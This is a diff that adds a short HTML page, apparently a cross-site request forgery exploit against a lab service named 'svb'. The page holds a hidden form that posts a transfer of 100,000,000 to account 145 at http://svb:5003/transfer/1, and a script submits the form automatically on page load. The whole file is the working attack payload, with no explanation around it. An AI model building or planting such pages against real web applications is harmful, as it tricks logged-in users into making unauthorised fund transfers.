@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form id="csrf-form" action="http://svb:5003/transfer/1" method="POST">
+      <input type="hidden" name="account" value="145">
+      <input type="hidden" name="amount" value="100000000">
+    </form>
+    <script>
+      document.getElementById("csrf-form").submit();
+    </script>
+  </body>
+</html>
